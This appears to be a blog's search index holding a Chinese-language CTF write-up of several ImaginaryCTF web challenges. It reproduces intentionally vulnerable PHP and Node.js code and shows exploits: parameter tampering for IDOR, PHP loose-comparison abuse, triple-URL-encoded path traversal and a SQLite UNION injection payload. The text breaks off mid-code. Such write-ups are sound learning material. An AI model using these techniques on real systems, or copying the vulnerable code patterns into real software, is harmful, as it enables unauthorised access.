<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>imaginary_ctf</title>
    <link href="/2023/07/23/imaginary-ctf/"/>
    <url>/2023/07/23/imaginary-ctf/</url>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Idoriot"><a href="#Idoriot" class="headerlink" title="Idoriot"></a>Idoriot</h3><p>打开题目看了眼，登陆加注册感觉是二次注入之类的，登陆界面闭合注释啥的都试了下，结果长得都一样↓，点进注册页面看看</p><p><img src="/2023/07/23/imaginary-ctf/image-20230723215418709.png"></p><p>随便账号输了个单引号闭合闭合666’，密码随便输了个123，网页回显源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php">Welcome, User ID: <span class="hljs-number">126181005</span><br>Source Code<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">// Check if user is logged in</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// Check if session is expired</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">time</span>() &gt; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;expires&#x27;</span>]) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: logout.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// Display user ID on landing page</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome, User ID: &quot;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]);<br><br><span class="hljs-comment">// Get the user for admin</span><br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;sqlite:memory:&#x27;</span>);<br><span class="hljs-variable">$admin</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE user_id = 0 LIMIT 1&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br><span class="hljs-comment">// Check if the user is admin</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$admin</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>] === <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) &#123;<br>    <span class="hljs-comment">// Read the flag from flag.txt</span><br>    <span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;<span class="hljs-subst">$flag</span>&lt;/p&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// Display the source code for this file</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Source Code&lt;/h1&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>从代码逻辑可以看出当执行sql语句<code>SELECT * FROM users WHERE user_id = 0 LIMIT 1</code>后第一行user_id的值和当前网页会话<code>SESSION[&#39;user_id&#39;]</code>相等时回显flag，从SQL查询语句容易得到就是要让<code>SESSION[&#39;user_id&#39;]</code>值为0，退出登录去logout.php，重新点注册，是session的话就说明是在提交表单环节设置的，bp抓个包,改post参数user_id为0，Forward。</p><p><img src="/2023/07/23/imaginary-ctf/image-20230723233809415.png"></p><p>getflag</p><p><img src="/2023/07/23/imaginary-ctf/image-20230723234155477.png"></p><hr><h3 id="idoriot-revenge"><a href="#idoriot-revenge" class="headerlink" title="idoriot-revenge"></a>idoriot-revenge</h3><p>和上一题同样的开头，先注册点开</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724000333876.png"></p><p>随便一个账号密码回显源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php">Welcome, User ID: <span class="hljs-number">736136856</span><br>Source Code<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">// Check if user is logged in</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// Check if session is expired</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">time</span>() &gt; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;expires&#x27;</span>]) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: logout.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// Display user ID on landing page</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome, User ID: &quot;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]);<br><br><span class="hljs-comment">// Get the user for admin</span><br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;sqlite:memory:&#x27;</span>);<br><span class="hljs-variable">$admin</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username = &quot;admin&quot; LIMIT 1&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br><span class="hljs-comment">// Check user_id</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user_id</span> = (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br>    <span class="hljs-comment">// Check if the user is admin</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user_id</span> == <span class="hljs-string">&quot;php&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$admin</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>        <span class="hljs-comment">// Read the flag from flag.txt</span><br>        <span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;<span class="hljs-subst">$flag</span>&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Display the source code for this file</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Source Code&lt;/h1&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看下面这部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$admin</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username = &quot;admin&quot; LIMIT 1&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br><span class="hljs-comment">// Check user_id</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user_id</span> = (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br>    <span class="hljs-comment">// Check if the user is admin</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user_id</span> == <span class="hljs-string">&quot;php&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$admin</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>        <span class="hljs-comment">// Read the flag from flag.txt</span><br>        <span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;<span class="hljs-subst">$flag</span>&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>SQL查询语句查询结果<code>$admin[&#39;username&#39;]</code>的值显然为’admin’，这回是检验GET传参数<code>$user_id</code>是否弱等于’php’，以及<code>$_SESSION[&#39;username&#39;]</code>是否包含<code>$admin[&#39;username&#39;]</code>，即’admin’，若比较由于会类型转换再比较，因此直接修改GET参数user_id值为’php’即可，至于<code>preg_match(&quot;/&quot;.$admin[&#39;username&#39;].&quot;/&quot;, $_SESSION[&#39;username&#39;])</code>条件，注册时随便注册一个包含’admin’的字符串作为用户名即可，</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724001412246.png"></p><p>再改参数：</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724001455538.png"></p><p>getflag</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724001513572.png"></p><hr><h3 id="roks"><a href="#roks" class="headerlink" title="roks"></a>roks</h3><p>网页内容：</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724001833675.png"></p><p>点’get rok picture’会随机显示一张石头的图片，查看源代码：</p><p>index.php主要内容如下，点击鼠标触发事件随机获取一张图片的url，然后直接带着url参数跳转到&#x2F;file.php?file&#x3D;url页面，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">button onclick=<span class="hljs-string">&quot;requestRandomImage()&quot;</span>&gt;get rok picture&lt;/button&gt;<br>    &lt;script&gt;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">requestRandomImage</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> imageList = [<span class="hljs-string">&quot;image1&quot;</span>, <span class="hljs-string">&quot;image2&quot;</span>, <span class="hljs-string">&quot;image3&quot;</span>, <span class="hljs-string">&quot;image4&quot;</span>, <span class="hljs-string">&quot;image5&quot;</span>, <span class="hljs-string">&quot;image6&quot;</span>, <span class="hljs-string">&quot;image7&quot;</span>, <span class="hljs-string">&quot;image8&quot;</span>, <span class="hljs-string">&quot;image9&quot;</span>, <span class="hljs-string">&quot;image10&quot;</span>]<br><br>            <span class="hljs-keyword">var</span> randomIndex = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * imageList.length);<br>            <span class="hljs-keyword">var</span> randomImageName = imageList[randomIndex];<br><br>            <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>            xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">if</span> (xhr.readyState === <span class="hljs-number">4</span> &amp;&amp; xhr.status === <span class="hljs-number">200</span>) &#123;<br>                    <span class="hljs-keyword">var</span> blob = xhr.response;<br>                    <span class="hljs-keyword">var</span> imageUrl = URL.<span class="hljs-title function_ invoke__">createObjectURL</span>(blob);<br>                    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;randomImage&quot;</span>).src = imageUrl;<br>                &#125;<br>            &#125;;<br><br>            xhr.<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;file.php?file=&quot;</span> + randomImageName, <span class="hljs-literal">true</span>);<br>            xhr.responseType = <span class="hljs-string">&quot;blob&quot;</span>;<br>            xhr.<span class="hljs-title function_ invoke__">send</span>();<br>        &#125;<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>file.php内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;/&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;.&quot;</span>)) &#123;<br>    <span class="hljs-variable">$contentType</span> = <span class="hljs-title function_ invoke__">mime_content_type</span>(<span class="hljs-string">&quot;stopHacking.png&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: <span class="hljs-subst">$contentType</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&quot;stopHacking.png&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$filePath</span> = <span class="hljs-string">&quot;images/&quot;</span> . <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-variable">$contentType</span> = <span class="hljs-title function_ invoke__">mime_content_type</span>(<span class="hljs-variable">$filePath</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: <span class="hljs-subst">$contentType</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filePath</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>if (str_contains($filename, &quot;/&quot;) or str_contains($filename, &quot;.&quot;))</code>条件防止任意文件读取，但是注意看$filename是经过参数file进行url解码得到的，PHP在获取GET参数的时候解码一次(获取POST参数时不会)，算上else里解码一次，总共需要进行三次解码，两次解码过后$filename不能含有<code>/</code>和<code>.</code>字符，因此，总共需要经过三次url编码，使得在不破坏url结构的同时能够绕过字符串过滤达到文件读取，那读什么文件呢，看下dockerfile，存在：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">COPY</span><span class="language-bash"> flag.png /</span><br></code></pre></td></tr></table></figure><p><img src="/2023/07/23/imaginary-ctf/image-20230724004055979.png"></p><p>传参：</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724004125580.png"></p><hr><h3 id="blank"><a href="#blank" class="headerlink" title="blank"></a>blank</h3><p>后端最核心部分代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs javascript">...........<br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br>  <span class="hljs-keyword">const</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br><br>  db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span> + username + <span class="hljs-string">&#x27;&quot; and password = &quot;&#x27;</span> + password+ <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, row</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error retrieving user&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">if</span> (row) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">loggedIn</span> = <span class="hljs-literal">true</span>;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Login successful!&#x27;</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>);<br>      &#125;<br>    &#125;<br>  &#125;);<br>&#125;);<br>..........<br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> == <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Welcome admin. The flag is &#x27;</span> + fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>));<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">loggedIn</span>) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;You must be admin to get the flag.&#x27;</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Unauthorized. Please login first.&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><code>&#39;SELECT * FROM users WHERE username = &quot;&#39;</code>拼接<code>username</code>拼接<code>&#39;&quot; and password = &quot;&#39;</code>拼接<code>password</code>拼接<code>&#39;&quot;&#39;</code>最终username和password均为双引号闭合</p><p>随便一个常规字符输入会显示<code>Invalid username or password</code>，但是传入双引号后出现<code>Error retrieving user</code>报错回显，这里注意，***sqlite3和Oracle不支持#号单行注释，只能使用–***，传入<code>&quot;--</code>，报错消失，再次变为<code>Invalid username or password</code>，探路完成，下面看源代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (row) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">loggedIn</span> = <span class="hljs-literal">true</span>;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Login successful!&#x27;</span>);<br>      &#125;<br></code></pre></td></tr></table></figure><p>要查询到结果，才能登陆成功，并设置session，没有session直接访问&#x2F;flag会</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Unauthorized. Please login first.&#x27;</span>);<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里就是一个简单的利用select查询字符串，当然我们得让原来的查询语句无查询结果，或者联合查询完后用limit语句，来使得查询结果为一条对吧。</p><p>之后第一个坑来了(个人做题时)，判断原查询结果字段数，别问，问就是上来没<code>order by</code>上来就是<code>union select 1,2</code>，默认只有用户名和密码两个字段了呜呜呜，结果咋地都是报错，卡了有一会，后面头脑发光，转过来了，欸，应该是有第三个字段，试了下<code>&quot; union select 1,2,3--</code>，欸，不出所料</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724010604690.png"></p><p><strong>判断字段数，很重要呜呜呜</strong></p><p>然后捏，当我们满心欢喜拿到session去访问&#x2F;flag时，欸嘿</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724010756515.png"></p><p>好吧扭头回去看源代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (row) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">loggedIn</span> = <span class="hljs-literal">true</span>;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Login successful!&#x27;</span>);<br>      &#125;<br></code></pre></td></tr></table></figure><p>session的username值是username赋的，username是我们传入的用户名(<code>const username = req.body.username;</code>)，所以就是说，弄了那么久，最后传进来的用户名是那一大坨”payload”，设置的session也是。。。不慌，想让传入的username值为admin，很好满足，别急，别忘了还有一个password注入点。</p><p>这回我们直接传入username为admin，懒得判断原查询结果哪个字段是admin了，索性三个都弄成admin，上payload：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">username:admin<br>password:&quot; union <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>--<br></code></pre></td></tr></table></figure><p>之后SQL语句变为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">SELECT * FROM users WHERE username = &quot;admin&quot; and password = &quot;&quot; union select &#x27;admin&#x27;,&#x27;admin&#x27;,&#x27;admin&#x27;--&quot;<br></code></pre></td></tr></table></figure><p>登陆成功后访问&#x2F;flag，拿到flag：</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724011741863.png"></p><hr><h3 id="Perfect-Picture"><a href="#Perfect-Picture" class="headerlink" title="Perfect Picture"></a>Perfect Picture</h3><p>看一眼源代码就是修改图片像素参数</p><hr><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>当你感觉什么都没有的时候，为什么不按下F12呢？  ————鲁迅</p><p>直接传&#x2F;?source</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724012342239.png"></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">&#x27;FLAG&#x27;</span>] ?? <span class="hljs-string">&#x27;jctf&#123;test_flag&#125;&#x27;</span>;<br><span class="hljs-variable">$magic</span> = <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">&#x27;MAGIC&#x27;</span>] ?? <span class="hljs-string">&#x27;aabbccdd11223344&#x27;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title 